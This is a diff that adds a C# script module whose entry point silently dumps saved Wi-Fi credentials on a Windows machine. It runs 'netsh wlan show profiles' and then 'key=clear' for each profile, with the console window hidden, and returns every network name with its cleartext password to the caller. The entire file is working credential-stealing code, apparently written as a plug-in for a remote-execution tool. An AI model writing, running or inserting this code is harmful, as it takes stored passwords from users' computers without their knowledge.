@@ -1,0 +1,76 @@
+﻿using System.Diagnostics;
+using System.Threading.Tasks;
+using System.Text.RegularExpressions;
+using System.Text;
+using System;
+
+public class Script
+{
+    public static async Task<string> ExecuteAsync()
+    {
+        return ExtractWiFiPasswords();
+    }
+    static string ExtractWiFiPasswords()
+    {
+        StringBuilder result = new StringBuilder();
+
+        try
+        {
+            Process process = new Process();
+            process.StartInfo.FileName = "netsh";
+            process.StartInfo.Arguments = "wlan show profiles";
+            process.StartInfo.UseShellExecute = false;
+            process.StartInfo.RedirectStandardOutput = true;
+            process.StartInfo.CreateNoWindow = true;
+            process.Start();
+
+            string output = process.StandardOutput.ReadToEnd();
+            process.WaitForExit();
+
+            string[] lines = output.Split('\n');
+            string pattern = @"All User Profile\s+:\s(.*)";
+
+            foreach (string line in lines)
+            {
+                Match match = Regex.Match(line, pattern);
+                if (match.Success)
+                {
+                    string profileName = match.Groups[1].Value.Trim();
+                    string password = GetPasswordForProfile(profileName);
+                    result.AppendLine(profileName + " : " + password); // Replace $ with +
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            result.AppendLine("An error occurred: " + ex.Message); // Replace $ with +
+        }
+
+        return result.ToString();
+    }
+    static string GetPasswordForProfile(string profileName)
+    {
+        Process process = new Process();
+        process.StartInfo.FileName = "netsh";
+        process.StartInfo.Arguments = "wlan show profile name=\"" + profileName + "\" key=clear"; // Replace $ with +
+        process.StartInfo.UseShellExecute = false;
+        process.StartInfo.RedirectStandardOutput = true;
+        process.StartInfo.CreateNoWindow = true;
+        process.Start();
+
+        string output = process.StandardOutput.ReadToEnd();
+        process.WaitForExit();
+
+        string passwordPattern = @"Key Content\s+:\s(.*)";
+        Match passwordMatch = Regex.Match(output, passwordPattern);
+
+        if (passwordMatch.Success)
+        {
+            return passwordMatch.Groups[1].Value.Trim();
+        }
+        else
+        {
+            return "Not found";
+        }
+    }
+}
